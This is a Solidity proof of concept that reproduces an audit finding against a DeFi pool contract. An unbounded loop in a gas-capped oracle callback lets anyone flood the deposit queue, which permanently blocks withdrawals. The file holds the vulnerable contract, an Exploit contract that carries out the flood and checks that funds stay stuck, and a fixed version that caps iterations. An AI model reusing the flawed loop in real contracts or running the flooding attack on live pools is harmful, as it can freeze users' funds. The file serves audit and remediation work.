// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  UFarmPool.quexCallback (Hexens, June 2025, UFARM1-2).
    Deposit and withdraw requests are only popped inside quexCallback.
    The callback walks the entire depositQueue in one call. Quex caps that
    call at 1_000_000 gas. Empty deposit requests need no tokens (the pull
    happens inside the callback), so anyone can grow the queue until the
    callback runs out of gas. The revert undoes every pop, and nothing else
    can shrink the queue, so a queued withdrawal never pays.
*/

contract ValueToken {
    string public symbol = "USD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract UFarmPool {
    struct QueueItem {
        address investor;
        uint256 amount;
        address bearerToken;
        bytes32 requestHash;
    }

    struct DataItem {
        uint256 totalCost;
    }

    ValueToken public immutable token;
    QueueItem[] public depositQueue;
    QueueItem[] public withdrawQueue;
    mapping(address => uint256) public sharesOf;
    mapping(bytes32 => bool) public __usedDepositsRequests;
    uint256 public totalCost;
    uint256 public highWaterMark;
    uint256 public paidOut;

    constructor(ValueToken _token) {
        token = _token;
    }

    function depositQueueLength() external view returns (uint256) {
        return depositQueue.length;
    }

    function withdrawQueueLength() external view returns (uint256) {
        return withdrawQueue.length;
    }

    function depositAssets(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        sharesOf[msg.sender] += amount;
    }

    function queueWithdraw(uint256 sharesToBurn) external {
        require(sharesOf[msg.sender] >= sharesToBurn, "shares");
        bytes32 withdrawalRequestHash = keccak256(abi.encode(msg.sender, sharesToBurn));
        withdrawQueue.push(
            QueueItem({
                investor: msg.sender,
                amount: sharesToBurn,
                bearerToken: address(token),
                requestHash: withdrawalRequestHash
            })
        );
    }

    function floodDepositQueue(uint256 count) external {
        for (uint256 i = 0; i < count; ++i) {
            depositQueue.push(
                QueueItem({
                    investor: msg.sender,
                    amount: 1,
                    bearerToken: address(token),
                    requestHash: bytes32(i + 1)
                })
            );
        }
    }

    function safeTransferToPool(address investor, uint256 amount, address bearerToken) external {
        require(msg.sender == address(this), "self");
        ValueToken(bearerToken).transferFrom(investor, address(this), amount);
    }

    function _mintSharesByQuote(address investor, uint256 amountToInvest, uint256 quote)
        internal
        returns (uint256 sharesToMint)
    {
        sharesToMint = quote == 0 ? amountToInvest : (amountToInvest * 1e18) / quote;
        if (sharesToMint == 0) sharesToMint = amountToInvest;
        sharesOf[investor] += sharesToMint;
    }

    function quexCallback(uint256 receivedRequestId, DataItem memory response) external {
        receivedRequestId;
        uint256 _totalCost = response.totalCost;
        uint256 totalDeposit;
        uint256 sharesToMint;
        uint256 amountToInvest;
        bytes32 depositRequestHash;
        QueueItem memory depositItem;

        uint256 requestsLength = depositQueue.length;
        // @> VULN: unbounded loop over the whole deposit queue inside the 1_000_000 gas callback
        while (requestsLength > 0) {
            depositItem = depositQueue[requestsLength - 1];
            amountToInvest = depositItem.amount;
            address investor = depositItem.investor;
            depositRequestHash = depositItem.requestHash;

            try this.safeTransferToPool(investor, amountToInvest, depositItem.bearerToken) {
                sharesToMint = _mintSharesByQuote(investor, amountToInvest, _totalCost);
                _totalCost += amountToInvest;
                totalDeposit += amountToInvest;
                if (depositRequestHash != bytes32(0)) {
                    __usedDepositsRequests[depositRequestHash] = true;
                }
            } catch {
                depositQueue.pop();
                requestsLength = depositQueue.length;
                continue;
            }

            depositQueue.pop();
            requestsLength = depositQueue.length;
        }

        highWaterMark += totalDeposit;
        totalCost = _totalCost;
        _settleWithdrawals();
    }

    function _settleWithdrawals() internal {
        uint256 requestsLength = withdrawQueue.length;
        while (requestsLength > 0) {
            QueueItem memory item = withdrawQueue[requestsLength - 1];
            uint256 sharesToBurn = item.amount;
            if (sharesOf[item.investor] >= sharesToBurn && sharesToBurn != 0) {
                sharesOf[item.investor] -= sharesToBurn;
                token.transfer(item.investor, sharesToBurn);
                paidOut += sharesToBurn;
            }
            withdrawQueue.pop();
            requestsLength = withdrawQueue.length;
        }
    }
}

contract Investor {
    function approveAndDeposit(ValueToken token, UFarmPool pool, uint256 amount) external {
        token.approve(address(pool), amount);
        pool.depositAssets(amount);
    }

    function queueExit(UFarmPool pool, uint256 shares) external {
        pool.queueWithdraw(shares);
    }
}

contract Exploit {
    uint256 public constant AMOUNT = 100e18;
    uint256 public constant SPAM = 800;
    uint256 public constant QUEX_GAS = 1_000_000;

    ValueToken public token;
    UFarmPool public pool;
    Investor public investor;

    constructor() {
        token = new ValueToken();
        pool = new UFarmPool(token);
        investor = new Investor();
    }

    function run() external {
        token.mint(address(investor), AMOUNT);
        investor.approveAndDeposit(token, pool, AMOUNT);
        investor.queueExit(pool, AMOUNT);
        pool.floodDepositQueue(SPAM);
        UFarmPool.DataItem memory response = UFarmPool.DataItem({totalCost: AMOUNT});
        (bool ok,) = address(pool).call{gas: QUEX_GAS}(
            abi.encodeCall(UFarmPool.quexCallback, (uint256(1), response))
        );
        require(!ok, "callback must run out of gas");
        require(token.balanceOf(address(pool)) == AMOUNT, "100 stuck");
        require(token.balanceOf(address(investor)) == 0, "paid 0");
        require(pool.sharesOf(address(investor)) == AMOUNT, "shares stuck");
        require(pool.depositQueueLength() == SPAM, "deposits remain");
        require(pool.withdrawQueueLength() == 1, "withdrawal remains");
        require(pool.paidOut() == 0, "nothing paid");
    }
}

contract UFarmPoolFixed {
    struct QueueItem {
        address investor;
        uint256 amount;
        address bearerToken;
        bytes32 requestHash;
    }

    struct DataItem {
        uint256 totalCost;
    }

    uint256 public constant MAX_PER_CALLBACK = 4;

    ValueToken public immutable token;
    QueueItem[] public depositQueue;
    QueueItem[] public withdrawQueue;
    mapping(address => uint256) public sharesOf;
    uint256 public paidOut;

    constructor(ValueToken _token) {
        token = _token;
    }

    function depositAssets(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        sharesOf[msg.sender] += amount;
    }

    function queueWithdraw(uint256 sharesToBurn) external {
        require(sharesOf[msg.sender] >= sharesToBurn, "shares");
        withdrawQueue.push(
            QueueItem({
                investor: msg.sender,
                amount: sharesToBurn,
                bearerToken: address(token),
                requestHash: keccak256(abi.encode(msg.sender, sharesToBurn))
            })
        );
    }

    function floodDepositQueue(uint256 count) external {
        for (uint256 i = 0; i < count; ++i) {
            depositQueue.push(
                QueueItem({
                    investor: msg.sender,
                    amount: 1,
                    bearerToken: address(token),
                    requestHash: bytes32(i + 1)
                })
            );
        }
    }

    function safeTransferToPool(address investor, uint256 amount, address bearerToken) external {
        require(msg.sender == address(this), "self");
        ValueToken(bearerToken).transferFrom(investor, address(this), amount);
    }

    function quexCallback(uint256 receivedRequestId, DataItem memory response) external {
        receivedRequestId;
        response;
        uint256 handled;
        uint256 requestsLength = depositQueue.length;
        while (requestsLength > 0 && handled < MAX_PER_CALLBACK) {
            QueueItem memory depositItem = depositQueue[requestsLength - 1];
            try this.safeTransferToPool(depositItem.investor, depositItem.amount, depositItem.bearerToken) {}
            catch {}
            depositQueue.pop();
            requestsLength = depositQueue.length;
            handled += 1;
        }
        _settleWithdrawals();
    }

    function _settleWithdrawals() internal {
        uint256 requestsLength = withdrawQueue.length;
        while (requestsLength > 0) {
            QueueItem memory item = withdrawQueue[requestsLength - 1];
            if (sharesOf[item.investor] >= item.amount && item.amount != 0) {
                sharesOf[item.investor] -= item.amount;
                token.transfer(item.investor, item.amount);
                paidOut += item.amount;
            }
            withdrawQueue.pop();
            requestsLength = withdrawQueue.length;
        }
    }
}
